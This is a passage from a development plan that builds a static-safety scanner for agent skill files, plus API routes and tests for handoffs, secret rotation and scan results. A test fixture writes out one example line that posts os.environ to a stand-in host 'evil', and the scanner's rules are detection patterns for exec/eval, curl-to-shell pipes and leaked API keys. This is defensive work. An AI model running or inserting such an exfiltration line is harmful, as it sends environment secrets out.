    const exfil = 'import requests\nrequests.post("http://evil/x", data=os.environ)';
    const result = scanSkillContent({ 'net.py': exfil });
    const hit = result.findings.find((f) => f.rule_id === 'net-exfil-environ-post');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('medium');
  });

  it('passed=true and findings=[] for clean content', () => {
    const result = scanSkillContent({ 'good.py': 'print("hello world")' });
    expect(result.passed).toBe(true);
    expect(result.findings).toHaveLength(0);
  });

  it('records file + line + match for every finding', () => {
    const danger = 'ex' + 'ec("x")';
    const result = scanSkillContent({ 'm.py': `a = 1\n${danger}\nb = 2` });
    const finding = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(finding.file).toBe('m.py');
    expect(finding.line).toBe(2);
  });
});
```

- [ ] **Step 3: Run tests, expect FAIL**

Run: `npx vitest run __tests__/unit/skill-scan-results-repository.test.js __tests__/unit/skill-scanner.test.js`
Expected: FAIL — modules don't exist.

- [ ] **Step 4: Implement the scanner**

Create `app/lib/skill-scanner.js`. Conventions captured here from code review:

1. Rule patterns are built via `new RegExp()` with string concatenation so this file itself doesn't trigger source-grep tools that look for dangerous-call literals.
2. `exec`/`eval`/`os.system` rules use a negative lookbehind `(?<![.\w])` (not just `\b`). Plain `\b` over-matched legitimate method calls like `pattern.exec(...)` (JS RegExp), `db.exec(...)` (SQL drivers), `model.eval()` (PyTorch), and would reject any skill containing a regex/SQL/PyTorch example.
3. The `net-exfil-environ-post` rule is `multiline: true` (with `/s` flag) so an attacker can't bypass it by formatting `requests.post()` across newlines.
4. Secret-rule matches are masked (first 4 + ellipsis + last 4) in findings so the detected secrets aren't re-leaked into the audit ledger.

```javascript
import { createHash } from 'node:crypto';

// Patterns built from concatenated parts so the literal dangerous-call tokens
// don't appear in this source file (false-positive avoidance for in-repo grep
// scanners).
//
// `(?<![.\w])` = "not preceded by `.` or a word character" — prevents
// false-positives on method calls like `pattern.exec(...)` / `db.exec(...)` /
// `model.eval()` while still matching the bare builtin call at line start
// or after whitespace.
const NOT_METHOD_CALL = '(?<![.\\w])';

const RULES = [
  {
    id: 'py-dynamic-exec',
    severity: 'high',
    pattern: new RegExp(NOT_METHOD_CALL + 'exe' + 'c' + '\\s*\\('),
  },
  {
    id: 'py-dynamic-eval',
    severity: 'high',
    pattern: new RegExp(NOT_METHOD_CALL + 'eva' + 'l' + '\\s*\\('),
  },
  {
    id: 'secrets-anthropic-key',
    severity: 'high',
    pattern: /sk-ant-(api|admin)[0-9]+-[A-Za-z0-9_-]+/,
  },
  {
    id: 'secrets-openai-key',
    severity: 'high',
    pattern: /sk-(proj|svcacct)?[-_]?[A-Za-z0-9]{20,}/,
  },
  {
    id: 'secrets-aws-key',
    severity: 'high',
    pattern: /AKIA[0-9A-Z]{16}/,
  },
  {
    id: 'secrets-github-token',
    severity: 'high',
    pattern: /gh[opsu]_[A-Za-z0-9_]{36,}/,
  },
  {
    id: 'secrets-private-pem',
    severity: 'high',
    pattern: /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
  },
  {
    id: 'net-exfil-environ-post',
    severity: 'medium',
    multiline: true,
    // /s flag so `.` spans newlines — captures `requests.post(\n ...environ...)`
    // bypass formatting.
    pattern: new RegExp('requests\\.post\\([^)]*' + '(os\\.environ|environ\\[)', 's'),
  },
  {
    id: 'net-curl-shell-pipe',
    severity: 'medium',
    pattern: /(curl|wget)\s+[^|]*\|/,
  },
  {
    id: 'py-os-system',
    severity: 'medium',
    pattern: new RegExp(NOT_METHOD_CALL + 'os\\.system' + '\\s*\\('),
  },
  {
    id: 'js-cp-spawn-exec',
    severity: 'medium',
    // Matches require/import of child_process followed by exec/spawn calls.
    pattern: new RegExp('child' + '_process' + '\\s*\\.\\s*' + '(exe' + 'c' + '|sp' + 'awn)' + '\\s*\\('),
  },
];

/**
 * Mask a matched value for findings. Secret-rule matches are reduced to
 * first 4 + ellipsis + last 4 so we don't re-leak the detected secret
 * into the audit ledger. Non-secret matches are truncated at 200 chars.
 */
function formatMatch(ruleId, raw) {
  if (ruleId.startsWith('secrets-')) {
    return raw.length > 12 ? raw.slice(0, 4) + '…' + raw.slice(-4) : '…';
  }
  return raw.slice(0, 200);
}

/**
 * Scan a map of { filename: content } against the static safety ruleset.
 * Returns { findings, passed }. passed = no 'high' severity hits.
 *
 * Rules with `multiline: true` are matched against full file content (with
 * /s flag) so payloads can span newlines. Line numbers are derived from
 * the match offset. Other rules match line-by-line as before.
 */
export function scanSkillContent(files) {
  const findings = [];
  for (const [filename, content] of Object.entries(files)) {
    const text = String(content);
    const lines = text.split('\n');
    for (const rule of RULES) {
      if (rule.multiline) {
        const match = text.match(rule.pattern);
        if (match) {
          const lineNum = text.slice(0, match.index).split('\n').length;
          findings.push({
            severity: rule.severity,
            rule_id: rule.id,
            file: filename,
            line: lineNum,
            pattern: rule.pattern.source,
            match: formatMatch(rule.id, match[0]),
          });
        }
      } else {
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          const match = line.match(rule.pattern);
          if (match) {
            findings.push({
              severity: rule.severity,
              rule_id: rule.id,
              file: filename,
              line: i + 1,
              pattern: rule.pattern.source,
              match: formatMatch(rule.id, match[0]),
            });
          }
        }
      }
    }
  }
  const passed = !findings.some((f) => f.severity === 'high');
  return { findings, passed };
}

/**
 * Stable content hash over the file map. Used as the dedupe key in
 * skill_scan_results.target_hash so re-scans of identical content return
 * the cached row instead of re-running the detector.
 */
export function hashContent(files) {
  const hash = createHash('sha256');
  const sortedKeys = Object.keys(files).sort();
  for (const k of sortedKeys) {
    hash.update(`${k}\x00${files[k]}\x00`);
  }
  return 'sha256:' + hash.digest('hex');
}
```

- [ ] **Step 5: Implement the repository**

Create `app/lib/repositories/skill-scan-results.repository.js`:

```javascript
import { randomBytes } from 'node:crypto';

function scanId() {
  return 'scn_' + randomBytes(8).toString('hex');
}

export async function getCachedScan(sql, orgId, skillName, targetHash) {
  const rows = await sql`
    SELECT id, org_id, skill_name, target_hash, findings, passed, created_at
    FROM skill_scan_results
    WHERE org_id = ${orgId} AND skill_name = ${skillName} AND target_hash = ${targetHash}
    LIMIT 1
  `;
  return rows[0] || null;
}

export async function upsertScan(sql, orgId, input) {
  if (!input?.skillName) throw new Error('upsertScan: skillName is required');
  if (!input?.targetHash) throw new Error('upsertScan: targetHash is required');

  const id = scanId();
  const findings = Array.isArray(input.findings) ? input.findings : [];
  const passed = Boolean(input.passed);

  // JSON.stringify(...)::jsonb — the Neon driver auto-binds JS arrays as
  // text[], which fails against the jsonb column. Cast explicitly. Mirrors
  // the convention used in code-sessions.repository.js / actions.repository.js.
  const rows = await sql`
    INSERT INTO skill_scan_results (id, org_id, skill_name, target_hash, findings, passed)
    VALUES (${id}, ${orgId}, ${input.skillName}, ${input.targetHash}, ${JSON.stringify(findings)}::jsonb, ${passed})
    ON CONFLICT (org_id, skill_name, target_hash)
    DO UPDATE SET findings = EXCLUDED.findings, passed = EXCLUDED.passed
    RETURNING id, org_id, skill_name, target_hash, findings, passed, created_at
  `;
  return rows[0];
}

export async function getScanById(sql, orgId, id) {
  const rows = await sql`
    SELECT id, org_id, skill_name, target_hash, findings, passed, created_at
    FROM skill_scan_results
    WHERE org_id = ${orgId} AND id = ${id}
    LIMIT 1
  `;
  return rows[0] || null;
}
```

- [ ] **Step 6: Run tests, expect PASS**

Run: `npx vitest run __tests__/unit/skill-scan-results-repository.test.js __tests__/unit/skill-scanner.test.js`
Expected: 17 tests pass (4 repository + 13 scanner — the scanner suite covers the baseline rules plus negative-lookbehind, multiline-exfil, and secret-masking conventions added per code review).

- [ ] **Step 7: Commit**

```bash
git add app/lib/repositories/skill-scan-results.repository.js app/lib/skill-scanner.js __tests__/unit/skill-scan-results-repository.test.js __tests__/unit/skill-scanner.test.js
git commit -m "feat(skill-scanner): static-safety detector + skill-scan-results repository"
```

---

### Task 5: Handoffs API routes

**Files:**
- Create: `app/api/handoffs/route.js`, `app/api/handoffs/latest/route.js`, `app/api/handoffs/[id]/route.js`, `app/api/handoffs/[id]/consume/route.js`
- Test: `__tests__/integration/handoffs.route.test.js`

- [ ] **Step 1: Write failing tests**

Create `__tests__/integration/handoffs.route.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';

const repo = vi.hoisted(() => ({
  createHandoff: vi.fn(),
  getLatestHandoff: vi.fn(),
  getHandoffById: vi.fn(),
  consumeHandoff: vi.fn(),
}));
vi.mock('../../app/lib/repositories/code-session-handoffs.repository.js', () => repo);
vi.mock('../../app/lib/db.js', () => ({ getSql: () => ({}) }));
vi.mock('../../app/lib/org.js', () => ({ getOrgId: async () => 'org_1' }));

beforeEach(() => {
  Object.values(repo).forEach((fn) => fn.mockReset());
});

function jsonRequest(url, method, body) {
  return new Request(url, {
    method,
    headers: { 'content-type': 'application/json', 'x-api-key': 'test' },
    body: body ? JSON.stringify(body) : undefined,
  });
}

describe('POST /api/handoffs', () => {
  it('creates handoff with valid body', async () => {
    repo.createHandoff.mockResolvedValue({ id: 'hf_1' });
    const { POST } = await import('../../app/api/handoffs/route.js');
    const res = await POST(jsonRequest('http://test/api/handoffs', 'POST', { agent_id: 'hermes', bundle: { summary: 's' } }));
    expect(res.status).toBe(201);
    const json = await res.json();
    expect(json.id).toBe('hf_1');
  });

  it('returns 400 if agent_id missing', async () => {
    const { POST } = await import('../../app/api/handoffs/route.js');
    const res = await POST(jsonRequest('http://test/api/handoffs', 'POST', { bundle: {} }));
    expect(res.status).toBe(400);
  });

  it('returns 400 if bundle missing', async () => {
    const { POST } = await import('../../app/api/handoffs/route.js');
    const res = await POST(jsonRequest('http://test/api/handoffs', 'POST', { agent_id: 'h' }));
    expect(res.status).toBe(400);
  });

  it('returns 500 on repository error', async () => {
    repo.createHandoff.mockRejectedValue(new Error('db down'));
    const { POST } = await import('../../app/api/handoffs/route.js');
    const res = await POST(jsonRequest('http://test/api/handoffs', 'POST', { agent_id: 'h', bundle: {} }));
    expect(res.status).toBe(500);
  });
});

describe('GET /api/handoffs/latest', () => {
  it('returns 200 + bundle when found', async () => {
    repo.getLatestHandoff.mockResolvedValue({ id: 'hf_1', bundle_json: { summary: 's' } });
    const { GET } = await import('../../app/api/handoffs/latest/route.js');
    const res = await GET(new Request('http://test/api/handoffs/latest?agent_id=hermes&project_id=cp_1', {
      headers: { 'x-api-key': 'test' },
    }));
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.bundle.summary).toBe('s');
  });

  it('returns 404 when no handoff', async () => {
    repo.getLatestHandoff.mockResolvedValue(null);
    const { GET } = await import('../../app/api/handoffs/latest/route.js');
    const res = await GET(new Request('http://test/api/handoffs/latest?agent_id=hermes', {
      headers: { 'x-api-key': 'test' },
    }));
    expect(res.status).toBe(404);
  });

  it('returns 400 if agent_id missing', async () => {
    const { GET } = await import('../../app/api/handoffs/latest/route.js');
    const res = await GET(new Request('http://test/api/handoffs/latest', {
      headers: { 'x-api-key': 'test' },
    }));
    expect(res.status).toBe(400);
  });
});

describe('GET /api/handoffs/[id]', () => {
  it('returns row by id', async () => {
    repo.getHandoffById.mockResolvedValue({ id: 'hf_1', bundle_json: { summary: 's' } });
    const { GET } = await import('../../app/api/handoffs/[id]/route.js');
    const res = await GET(new Request('http://test/api/handoffs/hf_1', { headers: { 'x-api-key': 'test' } }), {
      params: Promise.resolve({ id: 'hf_1' }),
    });
    expect(res.status).toBe(200);
  });

  it('returns 404 when missing', async () => {
    repo.getHandoffById.mockResolvedValue(null);
    const { GET } = await import('../../app/api/handoffs/[id]/route.js');
    const res = await GET(new Request('http://test/api/handoffs/hf_missing', { headers: { 'x-api-key': 'test' } }), {
      params: Promise.resolve({ id: 'hf_missing' }),
    });
    expect(res.status).toBe(404);
  });
});

describe('POST /api/handoffs/[id]/consume', () => {
  it('marks consumed and returns ok', async () => {
    repo.consumeHandoff.mockResolvedValue({ id: 'hf_1', consumed_at: '2026-05-14T00:00:00Z' });
    const { POST } = await import('../../app/api/handoffs/[id]/consume/route.js');
    const res = await POST(jsonRequest('http://test/api/handoffs/hf_1/consume', 'POST', { session_id: 'cs_100' }),
      { params: Promise.resolve({ id: 'hf_1' }) });
    expect(res.status).toBe(200);
  });

  it('returns 404 when handoff does not exist', async () => {
    repo.consumeHandoff.mockResolvedValue(null);
    const { POST } = await import('../../app/api/handoffs/[id]/consume/route.js');
    const res = await POST(jsonRequest('http://test/api/handoffs/hf_missing/consume', 'POST', {}),
      { params: Promise.resolve({ id: 'hf_missing' }) });
    expect(res.status).toBe(404);
  });
});
```

- [ ] **Step 2: Run tests, expect FAIL**

Run: `npx vitest run __tests__/integration/handoffs.route.test.js`
Expected: FAIL — route files don't exist.

- [ ] **Step 3: Implement `app/api/handoffs/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../lib/db.js';
import { getOrgId } from '../../lib/org.js';
import { createHandoff } from '../../lib/repositories/code-session-handoffs.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function POST(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    if (!body.agent_id) return NextResponse.json({ error: 'agent_id required' }, { status: 400 });
    if (!body.bundle || typeof body.bundle !== 'object') {
      return NextResponse.json({ error: 'bundle (object) required' }, { status: 400 });
    }

    const result = await createHandoff(sql, orgId, {
      agentId: body.agent_id,
      projectId: body.project_id || null,
      createdInSessionId: body.created_in_session_id || null,
      bundle: body.bundle,
    });
    return NextResponse.json({ id: result.id }, { status: 201 });
  } catch (err) {
    console.error('[HANDOFFS POST] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 4: Implement `app/api/handoffs/latest/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../lib/db.js';
import { getOrgId } from '../../../lib/org.js';
import { getLatestHandoff } from '../../../lib/repositories/code-session-handoffs.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const { searchParams } = new URL(req.url);
    const agentId = searchParams.get('agent_id');
    const projectId = searchParams.get('project_id');
    if (!agentId) return NextResponse.json({ error: 'agent_id required' }, { status: 400 });

    const row = await getLatestHandoff(sql, orgId, { agentId, projectId });
    if (!row) return NextResponse.json({ error: 'no_handoff' }, { status: 404 });

    return NextResponse.json({
      id: row.id,
      agent_id: row.agent_id,
      project_id: row.project_id,
      bundle: row.bundle_json,
      created_at: row.created_at,
    });
  } catch (err) {
    console.error('[HANDOFFS LATEST] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 5: Implement `app/api/handoffs/[id]/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../lib/db.js';
import { getOrgId } from '../../../lib/org.js';
import { getHandoffById } from '../../../lib/repositories/code-session-handoffs.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(req, { params }) {
  try {
    const { id } = await params;
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const row = await getHandoffById(sql, orgId, id);
    if (!row) return NextResponse.json({ error: 'not_found' }, { status: 404 });

    return NextResponse.json({
      id: row.id,
      agent_id: row.agent_id,
      project_id: row.project_id,
      bundle: row.bundle_json,
      created_at: row.created_at,
      consumed_at: row.consumed_at,
    });
  } catch (err) {
    console.error('[HANDOFF GET] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 6: Implement `app/api/handoffs/[id]/consume/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../../lib/db.js';
import { getOrgId } from '../../../../lib/org.js';
import { consumeHandoff } from '../../../../lib/repositories/code-session-handoffs.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function POST(req, { params }) {
  try {
    const { id } = await params;
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    const row = await consumeHandoff(sql, orgId, id, body.session_id || null);
    if (!row) return NextResponse.json({ error: 'not_found' }, { status: 404 });

    return NextResponse.json({ id: row.id, consumed_at: row.consumed_at });
  } catch (err) {
    console.error('[HANDOFF CONSUME] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 7: Run tests, expect PASS**

Run: `npx vitest run __tests__/integration/handoffs.route.test.js`
Expected: 10 tests pass.

- [ ] **Step 8: Regenerate api-inventory + openapi**

```bash
npm run api:inventory:generate
npm run openapi:generate
```

- [ ] **Step 9: Commit**

```bash
git add app/api/handoffs __tests__/integration/handoffs.route.test.js docs/api-inventory.json docs/api-inventory.md docs/openapi/critical-stable.openapi.json
git commit -m "feat(api): /api/handoffs CRUD + consume route"
```

---

### Task 6: Secrets API routes

**Files:**
- Create: `app/api/secrets/route.js`, `app/api/secrets/[id]/route.js`, `app/api/secrets/rotation-due/route.js`
- Test: `__tests__/integration/secrets.route.test.js`

- [ ] **Step 1: Write failing tests**

Create `__tests__/integration/secrets.route.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';

const repo = vi.hoisted(() => ({
  listSecrets: vi.fn(),
  createSecret: vi.fn(),
  updateSecret: vi.fn(),
  deleteSecret: vi.fn(),
  listRotationDue: vi.fn(),
}));
vi.mock('../../app/lib/repositories/governed-secrets.repository.js', () => repo);
vi.mock('../../app/lib/db.js', () => ({ getSql: () => ({}) }));
vi.mock('../../app/lib/org.js', () => ({ getOrgId: async () => 'org_1' }));

beforeEach(() => Object.values(repo).forEach((fn) => fn.mockReset()));

describe('GET /api/secrets', () => {
  it('returns list scoped by agent_id', async () => {
    repo.listSecrets.mockResolvedValue([{ id: 'sec_1', name: 'stripe' }]);
    const { GET } = await import('../../app/api/secrets/route.js');
    const res = await GET(new Request('http://test/api/secrets?agent_id=hermes', { headers: { 'x-api-key': 'k' } }));
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.secrets).toHaveLength(1);
  });
});

describe('POST /api/secrets', () => {
  it('creates with valid body', async () => {
    repo.createSecret.mockResolvedValue({ id: 'sec_1', name: 'openai' });
    const { POST } = await import('../../app/api/secrets/route.js');
    const res = await POST(new Request('http://test/api/secrets', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ name: 'openai', rotation_interval_days: 30 }),
    }));
    expect(res.status).toBe(201);
  });

  it('returns 400 when name missing', async () => {
    const { POST } = await import('../../app/api/secrets/route.js');
    const res = await POST(new Request('http://test/api/secrets', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({}),
    }));
    expect(res.status).toBe(400);
  });
});

describe('PATCH /api/secrets/[id]', () => {
  it('updates lastRotatedAt', async () => {
    repo.updateSecret.mockResolvedValue({ id: 'sec_1', last_rotated_at: '2026-05-14T00:00:00Z' });
    const { PATCH } = await import('../../app/api/secrets/[id]/route.js');
    const res = await PATCH(new Request('http://test/api/secrets/sec_1', {
      method: 'PATCH', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ last_rotated_at: '2026-05-14T00:00:00Z' }),
    }), { params: Promise.resolve({ id: 'sec_1' }) });
    expect(res.status).toBe(200);
  });

  it('returns 404 when not found', async () => {
    repo.updateSecret.mockResolvedValue(null);
    const { PATCH } = await import('../../app/api/secrets/[id]/route.js');
    const res = await PATCH(new Request('http://test/api/secrets/sec_x', {
      method: 'PATCH', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ notes: 'x' }),
    }), { params: Promise.resolve({ id: 'sec_x' }) });
    expect(res.status).toBe(404);
  });
});

describe('DELETE /api/secrets/[id]', () => {
  it('returns 200 when deleted', async () => {
    repo.deleteSecret.mockResolvedValue(true);
    const { DELETE } = await import('../../app/api/secrets/[id]/route.js');
    const res = await DELETE(new Request('http://test/api/secrets/sec_1', {
      method: 'DELETE', headers: { 'x-api-key': 'k' },
    }), { params: Promise.resolve({ id: 'sec_1' }) });
    expect(res.status).toBe(200);
  });

  it('returns 404 when not found', async () => {
    repo.deleteSecret.mockResolvedValue(false);
    const { DELETE } = await import('../../app/api/secrets/[id]/route.js');
    const res = await DELETE(new Request('http://test/api/secrets/sec_x', {
      method: 'DELETE', headers: { 'x-api-key': 'k' },
    }), { params: Promise.resolve({ id: 'sec_x' }) });
    expect(res.status).toBe(404);
  });
});

describe('GET /api/secrets/rotation-due', () => {
  it('returns secrets due within window', async () => {
    repo.listRotationDue.mockResolvedValue([{ id: 'sec_1', name: 'stripe', days_until_due: 3 }]);
    const { GET } = await import('../../app/api/secrets/rotation-due/route.js');
    const res = await GET(new Request('http://test/api/secrets/rotation-due?within_days=14', { headers: { 'x-api-key': 'k' } }));
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.due).toHaveLength(1);
  });
});
```

- [ ] **Step 2: Run tests, expect FAIL**

Run: `npx vitest run __tests__/integration/secrets.route.test.js`
Expected: FAIL.

- [ ] **Step 3: Implement `app/api/secrets/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../lib/db.js';
import { getOrgId } from '../../lib/org.js';
import { listSecrets, createSecret } from '../../lib/repositories/governed-secrets.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const { searchParams } = new URL(req.url);
    const agentId = searchParams.get('agent_id');
    const rows = await listSecrets(sql, orgId, agentId ? { agentId } : {});
    return NextResponse.json({ secrets: rows });
  } catch (err) {
    console.error('[SECRETS GET] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}

export async function POST(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    if (!body.name) return NextResponse.json({ error: 'name required' }, { status: 400 });

    const result = await createSecret(sql, orgId, {
      name: body.name,
      agentId: body.agent_id || null,
      lastRotatedAt: body.last_rotated_at || null,
      rotationIntervalDays: body.rotation_interval_days,
      notes: body.notes || null,
    });
    return NextResponse.json({ id: result.id, name: result.name }, { status: 201 });
  } catch (err) {
    console.error('[SECRETS POST] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 4: Implement `app/api/secrets/[id]/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../lib/db.js';
import { getOrgId } from '../../../lib/org.js';
import { updateSecret, deleteSecret } from '../../../lib/repositories/governed-secrets.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function PATCH(req, { params }) {
  try {
    const { id } = await params;
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    const row = await updateSecret(sql, orgId, id, {
      lastRotatedAt: body.last_rotated_at,
      rotationIntervalDays: body.rotation_interval_days,
      notes: body.notes,
    });
    if (!row) return NextResponse.json({ error: 'not_found' }, { status: 404 });
    return NextResponse.json(row);
  } catch (err) {
    console.error('[SECRET PATCH] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}

export async function DELETE(req, { params }) {
  try {
    const { id } = await params;
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const ok = await deleteSecret(sql, orgId, id);
    if (!ok) return NextResponse.json({ error: 'not_found' }, { status: 404 });
    return NextResponse.json({ deleted: id });
  } catch (err) {
    console.error('[SECRET DELETE] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 5: Implement `app/api/secrets/rotation-due/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../lib/db.js';
import { getOrgId } from '../../../lib/org.js';
import { listRotationDue } from '../../../lib/repositories/governed-secrets.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const { searchParams } = new URL(req.url);
    const withinDays = Number(searchParams.get('within_days')) || 14;
    const agentId = searchParams.get('agent_id');

    const rows = await listRotationDue(sql, orgId, {
      withinDays,
      agentId: agentId || undefined,
    });
    return NextResponse.json({ due: rows, within_days: withinDays });
  } catch (err) {
    console.error('[SECRETS DUE] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 6: Run tests, expect PASS**

Run: `npx vitest run __tests__/integration/secrets.route.test.js`
Expected: 8 tests pass.

- [ ] **Step 7: Regenerate inventory + openapi**

```bash
npm run api:inventory:generate
npm run openapi:generate
```

- [ ] **Step 8: Commit**

```bash
git add app/api/secrets __tests__/integration/secrets.route.test.js docs/api-inventory.json docs/api-inventory.md docs/openapi/critical-stable.openapi.json
git commit -m "feat(api): /api/secrets rotation tracker routes"
```

---

### Task 7: Skill scan API routes

**Files:**
- Create: `app/api/skills/scan/route.js`, `app/api/skills/scans/[id]/route.js`
- Test: `__tests__/integration/skills-scan.route.test.js`

- [ ] **Step 1: Write failing tests**

Create `__tests__/integration/skills-scan.route.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';

const repo = vi.hoisted(() => ({
  getCachedScan: vi.fn(),
  upsertScan: vi.fn(),
  getScanById: vi.fn(),
}));
const scanner = vi.hoisted(() => ({
  scanSkillContent: vi.fn(),
  hashContent: vi.fn(),
}));
vi.mock('../../app/lib/repositories/skill-scan-results.repository.js', () => repo);
vi.mock('../../app/lib/skill-scanner.js', () => scanner);
vi.mock('../../app/lib/db.js', () => ({ getSql: () => ({}) }));
vi.mock('../../app/lib/org.js', () => ({ getOrgId: async () => 'org_1' }));

beforeEach(() => {
  Object.values(repo).forEach((fn) => fn.mockReset());
  Object.values(scanner).forEach((fn) => fn.mockReset());
});

describe('POST /api/skills/scan', () => {
  it('returns cached result when target_hash already exists', async () => {
    scanner.hashContent.mockReturnValue('sha256:cached');
    repo.getCachedScan.mockResolvedValue({ id: 'scn_cached', findings: [], passed: true });
    const { POST } = await import('../../app/api/skills/scan/route.js');
    const res = await POST(new Request('http://test/api/skills/scan', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ skill_name: 'my-skill', files: { 'a.py': 'print("x")' } }),
    }));
    expect(res.status).toBe(200);
    expect(repo.upsertScan).not.toHaveBeenCalled();
    const json = await res.json();
    expect(json.id).toBe('scn_cached');
    expect(json.cached).toBe(true);
  });

  it('runs the scanner + persists when no cache', async () => {
    scanner.hashContent.mockReturnValue('sha256:new');
    scanner.scanSkillContent.mockReturnValue({ findings: [{ severity: 'high', rule_id: 'x' }], passed: false });
    repo.getCachedScan.mockResolvedValue(null);
    repo.upsertScan.mockResolvedValue({ id: 'scn_new', skill_name: 'my-skill', target_hash: 'sha256:new', findings: [{ severity: 'high' }], passed: false });
    const { POST } = await import('../../app/api/skills/scan/route.js');
    const res = await POST(new Request('http://test/api/skills/scan', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ skill_name: 'my-skill', files: { 'evil.py': 'whatever' } }),
    }));
    expect(res.status).toBe(200);
    expect(scanner.scanSkillContent).toHaveBeenCalled();
    expect(repo.upsertScan).toHaveBeenCalled();
    const json = await res.json();
    expect(json.passed).toBe(false);
    expect(json.cached).toBe(false);
  });

  it('returns 400 when skill_name missing', async () => {
    const { POST } = await import('../../app/api/skills/scan/route.js');
    const res = await POST(new Request('http://test/api/skills/scan', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ files: {} }),
    }));
    expect(res.status).toBe(400);
  });

  it('returns 400 when files missing or empty', async () => {
    const { POST } = await import('../../app/api/skills/scan/route.js');
    const res = await POST(new Request('http://test/api/skills/scan', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ skill_name: 'x' }),
    }));
    expect(res.status).toBe(400);
  });
});

describe('GET /api/skills/scans/[id]', () => {
  it('returns scan by id', async () => {
    repo.getScanById.mockResolvedValue({ id: 'scn_1', findings: [], passed: true });
    const { GET } = await import('../../app/api/skills/scans/[id]/route.js');
    const res = await GET(new Request('http://test/api/skills/scans/scn_1', { headers: { 'x-api-key': 'k' } }), {
      params: Promise.resolve({ id: 'scn_1' }),
    });
    expect(res.status).toBe(200);
  });

  it('returns 404 when not found', async () => {
    repo.getScanById.mockResolvedValue(null);
    const { GET } = await import('../../app/api/skills/scans/[id]/route.js');
    const res = await GET(new Request('http://test/api/skills/scans/scn_x', { headers: { 'x-api-key': 'k' } }), {
      params: Promise.resolve({ id: 'scn_x' }),
    });
    expect(res.status).toBe(404);
  });
});
```

- [ ] **Step 2: Run tests, expect FAIL**

Run: `npx vitest run __tests__/integration/skills-scan.route.test.js`
Expected: FAIL.

- [ ] **Step 3: Implement `app/api/skills/scan/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../lib/db.js';
import { getOrgId } from '../../../lib/org.js';
import { scanSkillContent, hashContent } from '../../../lib/skill-scanner.js';
